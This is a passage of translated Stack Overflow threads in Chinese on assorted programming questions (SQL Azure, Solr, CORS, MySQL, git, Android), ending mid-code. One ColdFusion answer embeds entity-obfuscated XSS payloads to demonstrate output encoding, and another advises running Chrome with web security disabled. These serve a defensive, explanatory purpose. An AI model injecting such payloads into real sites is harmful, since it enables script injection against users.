是的，pooling=False 是个坏主意。即使用于开发，我也不使用此选项。您应该始终使用 SQL Server 连接池。

但是，您必须注意的是 SQL Azure 中的瞬态错误。关于如何使用实体框架处理 SQL 中的瞬态错误，可以在 Internet 上找到一些很好的读物。这是一些（不完整的）列表：

*   [在 SQL Azure 中处理瞬态条件的最佳实践](http://windowsazurecat.com/2010/10/best-practices-for-handling-transient-conditions-in-sql-azure-client-applications/)
*   [SQL Azure 和 EF 故障处理](http://blogs.msdn.com/b/appfabriccat/archive/2010/12/11/sql-azure-and-entity-framework-connection-fault-handling.aspx)
*   [EF CodeFirst 和瞬态错误](http://blogs.msdn.com/b/cesardelatorre/archive/2012/04/24/entity-framework-code-first-dbcontext-and-sql-azure-connection-fault-handling.aspx)
*   [处理 SQL Azure 中的瞬态错误](http://convective.wordpress.com/2011/09/28/handling-transient-connection-failures-in-sql-azure/)

始终使用连接池，但要注意 SQL Azure 中的瞬态条件。

# solr - 容错 Solr 复制架构

> ID：10597053
> 
> 赞同：2
> 
> 时间：2012-05-15T08:40:24.140
> 
> 标签：solr, fault-tolerance

我正在使用 solr 进行复制。我有一个索引数据的主机和两个从主机提取索引并响应查询的从机。

我的问题是，如何创建容错架构？我的意思是当主服务器崩溃时我该怎么办？

使用复制中继器是一种选择，但我正在寻找更好的解决方案。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T18:43:52.030

即将推出的 4.0 版（仍在开发中）包括一个功能[SolrCloud](http://wiki.apache.org/solr/SolrCloud)，它为您提供容错主控和崩溃恢复。

# button - Android 应用 800x480 在平板电脑上显示为 BLURRY，但在 Nexus One 和模拟器上正常

> ID：10597054
> 
> 赞同：1
> 
> 时间：2012-05-15T08:40:26.633
> 
> 标签：button, user-interface, resolution, tablet, blurry

我正在为一个朋友编写一个应用程序，到目前为止它只包含一些标准按钮（来自 UI 模板的按钮）。我正在使用 4.0.3 API 15 ICS。当我使用目标平板电脑进行调试时，应用程序标题和按钮会抖动并褪色。好像是错误的分辨率。一切都设置为 800x480，这是平板电脑的分辨率。

当我在模拟器中运行它时，它很好。此外，当我使用具有相同分辨率的 Nexus One 进行调试时，它也很清晰。

有谁知道为什么平板电脑会模糊？谢谢

# jquery - Access-Control-Allow-Origin 不允许使用 HTTPS 的 Ripple Emulator Origin http://127.0.0.1:8000

> ID：10597058
> 
> 赞同：0
> 
> 时间：2012-05-15T08:40:44.167
> 
> 标签：jquery, cordova, ripple

我开始通过 HTTPS 协议使用我的 API，每个请求中的 Ripple 模拟器都会给我一条消息

**Access-Control-Allow-Origin 不允许使用 HTTPS 使用 Ripple Emulator Origin**

如果我使用 HTTP，一切正常。

我必须对 Ripple 使用 https 做些什么？

在 Ripple 的设置中，跨域代理设置为启用。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-08T09:39:30.140

我们可以在使用波纹时绕过跨域策略，在运行命令中使用以下内容：

```
chrome.exe --allow-file-access-from-files --enable-extensions --disable-web-security --user-data-dir=D:\tmp\chromedevuser 
```

感谢 Raymond Cadmen 的博客：我从那里得到了这段代码，帮助我减少了工作量

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T12:41:26.683

您必须在您的 API 中设置标题 'Access-Control-Allow-Origin: *'，在 PHP 中这可以实现添加 header('Access-Control-Allow-Origin: *');

不需要使用 HTTPS，但对于保护数据传输非常重要。

# mysql - 聚合特定行数

> ID：10597060
> 
> 赞同：2
> 
> 时间：2012-05-15T08:40:57.307
> 
> 标签：mysql, sql

我有一个包含很多行的数据库，我想连续汇总 10 行并计算一列的平均值。所以第1到10行将是平均值。一，第11到20行将是平均值。二等

这可以在MySql中完成吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T08:51:14.987

您需要对`GROUP BY FLOOR(something/10)`每 10 行进行分组。没有间隙的主自动增量键将是最好的。

```
SELECT FLOOR(something/10) as start_id, AVG(yourAmount)
FROM yourTable
GROUP BY FLOOR(something/10) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T00:18:46.043

我设法通过在一个简单的查询中使用别名和组/顺序来解决排序问题。

```
SELECT FLOOR(id/10) AS id_tmp, id AS sorter, AVG(col_1) AS col_1_avg 
FROM my_table
GROUP BY id_tmp
ORDER BY sorter DESC 
```

我不确定为什么会这样，但在 MySQL 5.0 中它仍然有效。

# r - 使用字符串索引 xts 并仅返回该确切时间的观察结果

> ID：10597064
> 
> 赞同：2
> 
> 时间：2012-05-15T08:41:07.727
> 
> 标签：r, time-series, xts

我在 R 中有一个 xts 时间序列，并且正在使用非常方便的函数来基于字符串对时间序列进行子集化，例如

```
time_series["17/06/2006 12:00:00"] 
```

这会将最近的观察返回到该日期/时间 - 这在许多情况下非常方便。但是，在这种特殊情况下，我只想返回该时间序列的元素。有没有办法在 xts 中使用这样一个不错的日期/时间字符串来做到这一点？

在更一般的情况下（我现在没有立即遇到这个问题，但怀疑我可能很快就会遇到它） - 是否有可能在一段时间内提取最接近的观察结果？例如，最接近给定日期/时间的观察，假设它在给定日期/时间的 10 分钟内 - 否则只需丢弃该观察。

我怀疑这种更一般的情况可能需要我编写一个函数来执行此操作——我很乐意这样做——我只是想检查 xts 中是否已经满足了更具体的情况（或一般情况）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T12:29:55.977

AFAIK，这样做的唯一方法是使用从您感兴趣的时间开始的子集，然后得到第一个观察结果。

例如

```
first(time_series["2006-06-17 12:00:00/2006-06-17 12:01"]) 
```

或者，更一般地说，要获得每天 12:00 的价格，您可以将每天的 1 分钟进行子集化，然后按天拆分并提取每个的第一个观察值。

```
do.call(rbind, lapply(split(time_series["T12:00:00/T12:01"],'days'), first)) 
```

这是 Jeff（xts 作者）考虑添加您想要的功能的线程 [http://r.789695.n4.nabble.com/Find-first-trade-of-day-in-xts-object-td3598441.html# a3599887](http://r.789695.n4.nabble.com/Find-first-trade-of-day-in-xts-object-td3598441.html#a3599887)

# epub - Epub：如果当前页面不适合，则在下一页开始阻止

> ID：10597065
> 
> 赞同：1
> 
> 时间：2012-05-15T08:41:10.830
> 
> 标签：epub, ibooks

在 epub 文件中有没有办法说一个块不应该在多个页面之间拆分，这样如果当前页面没有足够的空间来显示该块，那么该块应该从下一页开始，而不是从当前页面开始，然后溢出到下一页。

如果这在一般情况下是不可能的，那么在 ibooks 中工作并且不会在其他阅读器中引起问题的解决方案也很有用：-}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T20:30:10.133

我自己没有玩过它们，但你可能想看看 .css 寡妇和孤儿风格。[此处](http://idpf.org/epub/20/spec/OPS_2.0.1_draft.htm#Section3.3)的 2.0.1 规范支持它们（向下滚动到分页媒体部分）。在段落样式上设置足够高的数字可能会奏效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T04:05:35.700

使用`page-break-inside: avoid;`. 但是，正如其他人所提到的，您不应该期望这适用于每个平台。让所有读者在新页面上开始的唯一绝对万无一失的方法是将其放在单独的 XHTML 文件中。

# java - TYPE_FORWARD_ONLY 结果集的 isLast() 方法

> ID：10597068
> 
> 赞同：5
> 
> 时间：2012-05-15T08:41:25.163
> 
> 标签：java, jdbc, resultset

我一直在尝试寻找一种方法来知道我是否在结果集的最后一行，并且找到了 isLast() 方法。

我做了类似的事情：

```
if(rs.isLast()) {
    //do some operation here
} 
```

但它给我一个错误：仅转发结果集不支持请求的操作。

我搜索了一个解决方案，它说我应该更改 TYPE_FORDWARD_ONLY。但是现在，我想知道是否有办法通过使用 TYPE_FORWARD_ONLY 来知道我是否在最后一个记录集中？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T11:27:27.793

还有一种方法[`isAfterLast`](http://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html#isAfterLast%28%29)，您可以在调用`next`. TYPE_FORDWARD_ONLY 也不需要支持此功能，但无论如何您都可以尝试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:10:00.733

您的连接器可能不支持`TYPE_FORWARD_ONLY`您可以使用[DatabaseMetaData#supportsResultSetType(int)](http://docs.oracle.com/javase/6/docs/api/java/sql/DatabaseMetaData.html#supportsResultSetType%28int%29)检查它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T17:37:37.830

如果您的驱动程序不支持`afterLast`并且`isLast`您只能使用 TYPE_FORWARD_ONLY 结果集，那么您将需要处理所有行，然后在读取所有行后对最后一行执行您想要执行的额外操作。

# iphone - 从 Web、JSON 或 XML 加载内容的更好方法？

> ID：10597071
> 
> 赞同：0
> 
> 时间：2012-05-15T08:41:41.960
> 
> 标签：iphone, objective-c, xml, xcode, json

我有一个可以从网站加载内容的应用程序。

每次加载期间将有大约 100 篇文章。

如果我们查看以下内容，我想知道哪种方式更好地从网络加载内容：

*   速度
*   兼容性（如果我们使用特殊字符等，编码会有任何问题）
*   你的经历

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T08:42:51.357

如果您的数据量很大，JSON 会更好

在这里阅读更多

[http://www.json.org/xml.html](http://www.json.org/xml.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T08:45:58.807

强烈推荐 JSON 以获得更好的性能和更少的带宽消耗。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T09:27:32.803

一路JSON。Saad 的链接是比较两者的绝佳资源（与 Saad 相比 +1），但这是我根据您的帖子从经验中得出的结论：

*   速度

    JSON 在许多方面可能会更快。首先，语法要简单得多，因此解析和构造会更快。其次，它不那么冗长。这意味着通过电线传输会更快。

*   兼容性

    理论上，这里的 JSON 或 XML 都没有问题。在字符编码方面，我认为 JSON 胜出，因为您**必须**使用 Unicode。XML 允许您使用您喜欢的任何字符编码，但我看到解析器阻塞，因为顶部的行指定了一种编码，而实际数据使用不同的编码。

*   经验

    我发现 XML 很难手工制作。您可以在任何文本编辑器中编写 JSON，但 XML 确实需要一个特殊的 XML 编辑器才能使其正确。

    XML 在程序中更难操作。解析器必须处理更复杂的问题：名称空间、属性、实体、CDATA 等。因此，如果您使用基于流的解析器，则需要跟踪属性、元素内容、名称空间映射等。基于 DOM 的解析器往往会生成复杂的自定义图形对象（因为它们必须这样做才能对复杂性进行建模）。我不得不承认，我从未使用过基于流的 JSON 解析器，但是生成对象图的解析器可以使用自然的 Objective-C 集合。

    在 iPhone 上，Cocoa 中没有内置的 XML DOM 解析器（您可以使用基于 C 的解析器 - libxml2），但从 iOS 5 开始有一个简单易用的 JSON 解析器。

综上所述，如果我能控制链接的两端，我每次都会使用 JSON。在 OS X 上，如果我需要结构化的人类可读文档格式，我将使用 JSON。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T11:09:36.227

你说你正在加载“文章”。如果您的意思是包含富文本（斜体和粗体之类的东西）的文档，那么 JSON 是否是一个选项就不清楚了——JSON 并没有真正做混合内容。

如果它是纯粹的简单结构化数据，并且您不必处理复杂性，例如通信两端的软件需要单独发展而不是保持锁定同步，那么 JSON 更简单、更便宜：您不需要需要 XML 的额外功能或复杂性。

# java - 将arraylist转换为html表

> ID：10597072
> 
> 赞同：1
> 
> 时间：2012-05-15T08:41:44.557
> 
> 标签：java, html, servlets, arraylist

如何将我的数组列表检索到 html 表中？

我的数组列表：

```
[
1, 2011-05-10,  1,  22.0, 
2, 2011-05-10,  2,  5555.0, 
3, 2011-05-11,  3,  123.0, 
4, 2011-05-11,  2, 212.0, 
5, 2011-05-30,  1,  3000.0, 
6, 2011-05-30,  1,  30.0, 
7, 2011-06-06,  1,  307.0, 
8, 2011-06-06,  1,  307.0 ]

out.println("<html>");
        out.println("<head>");
        out.println("<title>Counter</title>");
        out.println("</head>");
        out.println("<body>");
        out.println("<table border=\"1\">");
        out.println("<tr>");
        for (int i = 0; i < ex.getExpenses().size(); i++) {
            out.println("<td>" + ex.getExpenses().get(i) + "</td>");

            if (i>0 && i%4==0) {
                out.println("</tr><tr>");

            }

        }
        out.println("</tr>");
        out.println("</table>");
        out.println("</body>");
        out.println("</html>"); 
```

这实际上不起作用，因为 arraylist 以 0 开头，它给了我如下所示的表：![在此处输入图像描述](../Images/b1bb349a9c4df1841e0514b6421818e0.png)

我如何获得如下所示的表格：

```
1 2011-05-10  1  22.0
2 2011-05-10  2  5555.0 
3 2011-05-11  3  123.0 
4 2011-05-11  2  212.0 
5 2011-05-30  1  3000.0
6 2011-05-30  1  30.0
7 2011-06-06  1  307.0
8 2011-06-06  1  307.0 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T08:45:57.737

代替

```
 for (int i = 0; i < ex.getExpenses().size(); i++) {
        out.println("<td>" + ex.getExpenses().get(i) + "</td>");
        if (i>0 && i%4==0) {
            out.println("</tr><tr>");
        }
    } 
```

和

```
 for (int i = 0; i < ex.getExpenses().size(); i++) {
        if (i>0 && i%4==0) {
            out.println("</tr><tr>");
        }
        out.println("<td>" + ex.getExpenses().get(i) + "</td>");
    } 
```

顺便一提。创建`Expenses`包含 4 个字段的单独类。将其转换为 html 会更干净、更容易。您可以编写特殊的单独方法来转换`Expenses`为 html 表格行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T08:46:09.733

更改`i`为`(i+1)`：

```
[
1, 2011-05-10,  1,  22.0, 
2, 2011-05-10,  2,  5555.0, 
3, 2011-05-11,  3,  123.0, 
4, 2011-05-11,  2, 212.0, 
5, 2011-05-30,  1,  3000.0, 
6, 2011-05-30,  1,  30.0, 
7, 2011-06-06,  1,  307.0, 
8, 2011-06-06,  1,  307.0 ]

out.println("<html>");
        out.println("<head>");
        out.println("<title>Counter</title>");
        out.println("</head>");
        out.println("<body>");
        out.println("<table border=\"1\">");
        out.println("<tr>");
        for (int i = 0; i < ex.getExpenses().size(); i++) {
            out.println("<td>" + ex.getExpenses().get(i) + "</td>");

            if (i>0 && (i+1)%4==0) {
                out.println("</tr><tr>");

            }

        }
        out.println("</tr>");
        out.println("</table>");
        out.println("</body>");
        out.println("</html>"); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-15T08:47:18.870

第一件事：将 arrylist 放入单独的变量中，然后使用 foreach 对其进行迭代，而不是重复调用 get() 和 get(i)，然后更改您的 if 条件

```
if ((i+1)%4==0) {
          out.println("</tr><tr>");
     } 
```

第二件事：使用`StringBuilder`类连接输出字符串，然后只用一个打印它`out.print`

# coldfusion - encodeForHtml() 与 htmlEditFormat()

> ID：10597073
> 
> 赞同：9
> 
> 时间：2012-05-15T08:41:45.183
> 
> 标签：coldfusion, esapi, coldfusion-10

`encodeForHtml()`（CF10 中的新功能）vs `htmlEditFormat()`，它们有什么不同？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-15T09:35:11.817

我认为它与 java 的 OWASP ESAPI 中的 encodeForHTML 函数相同。更安全地避免 XSS 攻击以使用 HTML 中的内容。

```
<cfsavecontent variable="htmlcontent">
<html>
    <head>
        <script>function hello() {alert('hello')}</script>
    </head>
    <body>
        <a href="#bookmark">Book Mark &amp; Anchor</a><br/>
        <div class="xyz">Div contains & here.</div>
        <IMG     SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#    x27&#x58&#x53&#x53&#x27&#x29>
    <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
</body>
</html></cfsavecontent>

<cfoutput>#htmleditformat(htmlcontent)#</cfoutput>
<br />
<cfoutput>#encodeforhtml(htmlcontent)#</cfoutput> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-04-06T00:21:50.310

EncodeFor* 函数基于 OWASP ESAPI 库。主要区别在于 HTMLEditFormat() 仅替换“坏”字符串，如`&`，`<`并`>`用好的字符串，如`&amp;`，`&lt;`而`&gt;`EncodeForHTML() 更智能，一个优点是它可以识别已经编码的内容，而不是对其进行双重编码.

例如，如果用户向您的网站提交了以下内容：

```
<div>
Here is <i>test</i> html content includes<br/>
<script>alert('hello')</script>
Notice how &amp; rendered with both functions.
</div> 
```

HTMLEditFormat() 和 EncodeForHTML() 都可以正确地转义 '<' 和 '>' 字符。但是 HTMLEditFormat() 会盲目地`&`再次编码，这样你的输出看起来像：

`... how &amp;amp; rendered ...`

否则它会像 encodeForHTML() 一样：

`... how &amp; rendered ...`

HTMLEditFormat() 无法判断与符号已经编码，因此它再次重新编码。这是一个简单的示例，但它演示了 ESAPI 库如何更智能，因此更安全。

底线，没有理由在 CF10+ 中使用 HTMLEditFormat()。为获得最大程度的保护，您应该将 Format 函数替换为 Encode 函数。

上面的完整示例和更多背景信息位于 isummation：[http ://www.isummation.com/blog/day-2-avoid-cross-site-scripting-xss-using-coldfusion-10-part-1/](http://www.isummation.com/blog/day-2-avoid-cross-site-scripting-xss-using-coldfusion-10-part-1/)

# sharepoint-2010 - CAML 中的 isnull 和 in 语句

> ID：10597082
> 
> 赞同：0
> 
> 时间：2012-05-15T08:42:42.723
> 
> 标签：sharepoint-2010, caml

是否可以将sharepoint`<In>`语句与`<IsNull>`语句结合起来？我只是设法使用 an 来让它工作，`<Or>`但如果你可以直接将它`<isNull>`放在里面会很棒`<In>`。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:01:43.167

解决方法如下：

```
<Query>
   <Where>

      <In>
         <FieldRef Name='MyLookupField' LookupId='TRUE'/>
         <Values>
           <Value Type='Lookup'></Value>
           <Value Type='Lookup'>1</Value>
         </Values>
      </In>

   </Where>
</Query> 
```

# iphone - 我应该在打开 MKMapView 时检查互联网连接吗？

> ID：10597088
> 
> 赞同：2
> 
> 时间：2012-05-15T08:43:16.140
> 
> 标签：iphone, ios, mkmapview, reachability

在我的 iOS 应用程序中，我想显示一个 MKMapView。我应该在打开地图视图之前检查可达性吗？

在大多数情况下，用户将拥有他想要缓存的地图，这样他就可以在没有互联网连接的情况下打开地图视图。那么为什么不让他打开地图视图呢？

如果我不检查可访问性，我的应用会被批准在 App Store 中使用吗？还是会被拒绝？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-17T10:13:19.317

您不需要检查可达性，但您应该使用`MKMapViewDelegate`方法检查地图视图何时加载失败[`mapViewDidFailLoadingMap:withError:`](http://developer.apple.com/library/ios/DOCUMENTATION/MapKit/Reference/MKMapViewDelegate_Protocol/MKMapViewDelegate/MKMapViewDelegate.html#//apple_ref/occ/intfm/MKMapViewDelegate/mapViewDidFailLoadingMap%3awithError%3a)。当您未能响应这些错误时，有时会发生拒绝。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-16T05:15:19.807

它不会因此而被丢弃，我制作了一个不检查互联网连接的地图应用程序，我相信很多其他人也有。

# git - 将子目录永久重置为特定的过去状态

> ID：10597089
> 
> 赞同：6
> 
> 时间：2012-05-15T08:43:16.660
> 
> 标签：git

在 git 存储库中，我有一个子目录，我想将其重置为过去的特定状态（较早的提交）。是否可以撤消对特定子目录中文件的所有提交？我认为没有提交会同时将更改应用于此子目录中的文件以及位于其他位置的文件。*但是，如果可以在不*位于此目录中的不受影响的文件上保留提交，那会很好吗？

我不需要删除历史记录。签出旧状态，删除子目录的当前内容，并在其位置复制并提交旧状态是没有问题的。但最终可能会有一种更优雅（*gitonic*）的方式。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-15T08:52:07.887

最简单的方法是使用`git checkout`在子目录上应用的能力。然后阶段并提交：

```
git checkout <old-SHA1> -- path/to/subdir
git add -A path/to/subdir
git commit -m "reverted files in path/to/subdir to what it was at <old-SHA1>" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T11:23:42.150

如果您计算出所有要撤消的提交，您可以使用[git revert](http://schacon.github.com/git/git-revert.html)将它们撤消 - 如果只有一两个提交是麻烦制造者，这将是最有用的。

[如果有很多提交，或者提交涉及项目的其他部分， CharlesB 的答案](https://stackoverflow.com/a/10597229/1612)是一种更简单的方法（但您实际上可以通过使用 -n（不自动提交）标志来解决这个问题，并且只提交更改你对。。。感兴趣）

# java - 从/向mySQL数据库读取和写入的在线java小程序？

> ID：10597090
> 
> 赞同：0
> 
> 时间：2012-05-15T08:43:19.413
> 
> 标签：java, php, jquery, mysql

我正在考虑创建一个向用户学习的小聊天机器人，类似于 Clever-Bot（但它的学习方式非常不同），但我需要一种方法来连接我使用的任何语言，与 mySQL。

我在想 java 会是更聪明的选择，尽管在四处寻找之后，将它与服务器集成似乎有点困难。这是真的？如果没有，我将如何去做？

否则，使用 JavaScript/jQuery/PHP 会更聪明吗？我对这些非常擅长，并且没有大量的 Java 经验（但这将是一个很好的做法）。

想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:47:38.527

要创建聊天机器人，请考虑[AIML](http://en.wikipedia.org/wiki/AIML)。还有一个解释器可以帮助您使用您的 AIML 文件。我会说，使用后端数据库并不是一件好事，因为 AIML 是为人工智能而构建的，在你的情况下是聊天机器人。互联网上大多数著名的聊天机器人都使用 AIML，例如[ALICE](http://alice.pandorabots.com/)。

# jexcelapi - jexcel在创建文件时生成错误

> ID：10597095
> 
> 赞同：0
> 
> 时间：2012-05-15T08:43:36.577
> 
> 标签：jexcelapi

```
InputStream inp = new FileInputStream("workbook.xls");
//InputStream inp = new FileInputStream("workbook.xlsx");

Workbook wb = WorkbookFactory.create(inp); 
```

它现在以这种方式 JExcel 使用我的 Java 应用程序写入 Excel 工作表。

如何将数组中的数据导出到 Excel 电子表格？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:48:37.090

将输出写入文件我认为在写入文件的情况下它可能会起作用

```
 FileOutputStream fileOut = new FileOutputStream("workbook.xls");
    // new FileOutputStream("workbook.xlsx");
    wb.write(fileOut);
    fileOut.close(); 
```

# android - 将您当前的位置从一项活动发送到另一项活动

> ID：10597096
> 
> 赞同：2
> 
> 时间：2012-05-15T08:43:41.733
> 
> 标签：android, google-maps

我想在一项活动中获取我的位置，然后将其发送到另一个活动（当我单击按钮时），然后在地图上显示我的位置。这是我的代码（问题是，地图没有动画到我当前的位置，我相信第一个活动没有获得当前位置并将 null 发送到第二个活动）：

```
public class ActivityMain extends MapActivity {

private LocationManager locationManager;
private LocationListener locationListener;
private GeoPoint currentGeoPoint = null;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activitymain);

    try{
         locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
         locationListener = new getLocation();
         locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);

    }
    catch (NullPointerException e){
        System.out.println("Null");
        e.printStackTrace();
    }
    catch (Exception e) {
        e.printStackTrace();
    }   
}

public void onButton1Click(View view) {

    Intent intent = new Intent(ActivityMain.this, ActivityMap.class);
     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

     if(currentGeoPoint != null){
         intent.putExtra("lat", currentGeoPoint.getLatitudeE6());
         intent.putExtra("long", currentGeoPoint.getLongitudeE6());
     }
     else{

         try{
             locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
             locationListener = new getLocation();
             locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);

        }
        catch (NullPointerException e){
            System.out.println("Null");
            e.printStackTrace();
        }
        catch (Exception e) {
            e.printStackTrace();
        }   
     }

     Context c = getApplicationContext();
     c.startActivity(intent);

     //Intent intent = new Intent(ActivityMain.this, ActivityMap.class);
    //this.startActivity(intent);

}

public void onButton2Clik (View view){
    Intent intent = new Intent(ActivityMain.this, ActivityListCategories.class);
    this.startActivity(intent);

    } 

class getLocation implements LocationListener {

    public void onLocationChanged(Location location) {
        if (location != null){
        GeoPoint currentPoint = getCurrentPoint(location);
        currentGeoPoint = currentPoint; 

        }

    }

    public void onStatusChanged(String provider, int status, Bundle extras) {
        // TODO Auto-generated method stub

    }

    public void onProviderEnabled(String provider) {
        Toast.makeText(getApplicationContext(), getProvider() + " enabled", Toast.LENGTH_SHORT).show();

    }

    public void onProviderDisabled(String provider) {
        Toast.makeText(getApplicationContext(), getProvider() + " disabled", Toast.LENGTH_SHORT).show();            
    }

}

public GeoPoint getLastKnownPoint (){

    GeoPoint lastKnownPoint = null;
    Location lastKnownLocation = locationManager.getLastKnownLocation(getProvider());
    if(lastKnownLocation != null){
         lastKnownPoint = getCurrentPoint(lastKnownLocation);
    }

    return lastKnownPoint;
}

public GeoPoint getCurrentPoint (Location location){
    GeoPoint currentPoint = new GeoPoint((int)(location.getLatitude()*1E6),(int)(location.getLongitude()*1E6));
    return currentPoint;

}

public String getProvider() {
    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    Criteria criteria = new Criteria();
    criteria.setPowerRequirement(Criteria.NO_REQUIREMENT);
    criteria.setAccuracy(Criteria.NO_REQUIREMENT);
    String Provider = locationManager.getBestProvider(criteria, true);
    return Provider;
}

@Override
protected boolean isRouteDisplayed() {
    // TODO Auto-generated method stub
    return false;
}

protected void onResume(){
    super.onResume();
    LocationManager newLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    locationManager = newLocationManager;
    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);

}

protected void onPause(){
    super.onPause();
    locationManager.removeUpdates(locationListener);

}

protected void onDestroy(){
    super.onDestroy();
    locationManager.removeUpdates(locationListener);

} 
```

}

这是第二个活动的代码

```
public class ActivityMap extends MapActivity {

private MapController mapController;
private MapView mapView;
private LocationManager locationManager;
private LocationListener locationListener;
private GeoPoint currentGeoPoint;
private Location currentLocation = null;
private ClassMapOverlay currPos;
private ClassCustomItemizedOverlay<ClassCustomOverlayItem> mallsOverlay;
private List<ClassMall> malls;

// TODO: AsyncTAsk

 public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activitymap);

        Bundle bundle = getIntent().getExtras();

        if(bundle != null){
            currentGeoPoint = new GeoPoint((int)(bundle.getDouble("lat") / 1E6),(int)(bundle.getDouble("long")/1E6));
            animateToCurrentPoint(currentGeoPoint);

        }

        mapView = (MapView) findViewById(R.id.mapView);
        mapController = mapView.getController();

    public GeoPoint getLastKnownPoint (){

        GeoPoint lastKnownPoint = null;
        Location lastKnownLocation = locationManager.getLastKnownLocation(getProvider());
        if(lastKnownLocation != null){
             lastKnownPoint = getCurrentPoint(lastKnownLocation);
        }

        return lastKnownPoint;
    }

    public GeoPoint getCurrentPoint (Location location){
        GeoPoint currentPoint = new GeoPoint((int)(location.getLatitude()*1E6),(int)(location.getLongitude()*1E6));
        return currentPoint;

    }

    public void animateToCurrentPoint(GeoPoint currentPoint){

        mapController.animateTo(currentPoint);
        mapController.setCenter(currentPoint);
        mapController.setZoom(15);
    }

    public void drawCurrPositionOverlay(){
        List<Overlay> overlays = mapView.getOverlays();
        overlays.remove(currPos);
        Drawable marker = getResources().getDrawable(R.drawable.me);
        currPos = new ClassMapOverlay(marker,mapView);
        GeoPoint drawMyPoint = null;

        if(currentGeoPoint==null){
            drawMyPoint = getLastKnownPoint();
        }

       else {

           drawMyPoint = currentGeoPoint;
       }

        OverlayItem overlayitem = new OverlayItem(drawMyPoint, "Moja adresa:", getAddress(currentLocation));
        currPos.addOverlay(overlayitem);
        overlays.add(currPos);
        currPos.setCurrentLocation(currentLocation);

    }

    public void drawMallsOverlay(List <ClassMall> malls){

        List <Overlay> overlays = mapView.getOverlays();
        overlays.remove(mallsOverlay);
        Drawable marker = getResources().getDrawable(R.drawable.malls);
        mallsOverlay = new ClassCustomItemizedOverlay<ClassCustomOverlayItem>(marker, mapView);

        if(malls.size() > 0){
            for(ClassMall temp: malls ){
                GeoPoint mallPoint = getLatLon(temp.getAddress());
                ClassCustomOverlayItem overlayItem = new ClassCustomOverlayItem(mallPoint,temp.getName(),temp.getAddress(), temp.getUrl());
                mallsOverlay.addOverlay(overlayItem);
                //Toast.makeText(getApplicationContext(), temp, Toast.LENGTH_SHORT).show();
            }
        }

        overlays.add(mallsOverlay);

    }

    public String getProvider() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Criteria criteria = new Criteria();
        criteria.setPowerRequirement(Criteria.NO_REQUIREMENT);
        criteria.setAccuracy(Criteria.NO_REQUIREMENT);
        String Provider = locationManager.getBestProvider(criteria, true);
        return Provider;
    }

    public  String getAddress (Location location){

        Geocoder geoCoder = new Geocoder(getApplicationContext(), Locale.getDefault());  
        String sAddress = "";

        try{
            List <Address> address = geoCoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
            if(address.size() > 0){
                for(int i = 0; i < address.get(0).getMaxAddressLineIndex(); i++){
                    sAddress += address.get(0).getAddressLine(i) + "\n";
                }
            }

        }
        catch (IOException e){
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), e.toString(), Toast.LENGTH_SHORT).show();
        }

        return sAddress;

    } 

    public GeoPoint getLatLon (String address){
        Geocoder geoCoder = new Geocoder(this, Locale.getDefault());
        GeoPoint point = null;
        List <Address> addresses = null;
        try {
                addresses = geoCoder.getFromLocationName(address, 1);
                if(addresses.size() > 0){
                     point = new GeoPoint((int) (addresses.get(0).getLatitude() * 1E6), 
                                                  (int) (addresses.get(0).getLongitude()*1E6));
                    }

        } catch (IOException e) {
                e.printStackTrace();
                Toast.makeText(getApplicationContext(), e.toString(), Toast.LENGTH_SHORT).show();
        }
        return point;
    }

    @Override
    protected boolean isRouteDisplayed() {
